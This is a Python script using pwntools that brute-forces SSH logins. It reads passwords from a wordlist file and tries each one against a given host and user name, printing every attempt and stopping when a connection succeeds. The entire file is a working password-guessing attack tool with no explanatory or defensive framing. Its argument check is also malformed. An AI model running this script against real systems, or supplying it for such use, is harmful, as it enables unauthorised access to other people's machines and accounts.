import sys
from pwn import *

if (len(sys.argv[1]) or
    len(sys.argv[2]) or 
    len(sys.argv[3]) or
    len(sys.argv[4])) == 0:
    print("One or more arguments are empty")
    exit()

host = sys.argv[1]
user = sys.argv[2]
fileName = sys.argv[3]
timeOut = sys.argv[4]

def tryConnect(
        host:string,
        user:string,
        password:string,
        timeout:int):
    try:
        response = ssh(
            host=host,
            user=user,
            password=password,
            timeout=timeout)
        if response.connected():
            response.close()
            return "Connected"
    except Exception as exception:
        return str(exception)

def openFile(fileName:string):
    with open (fileName, "r") as values:
        for value in values:
            value = value.strip("\n")
            yield value

def tryBruteForce(
        host:string,
        user:string,
        fileName:string,
        timeOut:int):
    try:
        attempts = 1
        for password in openFile(fileName):
            print(
                "[{}] Attempting password: '{}'"
                    .format(attempts, password))
            connection = tryConnect(host, user, password, timeOut)
            match connection:
                case "Connected":
                    print(connection)
                    break
                case _:
                    print(connection)
            attempts += 1
    except Exception as exception:
        print(exception)

tryBruteForce(host, user, fileName, timeOut)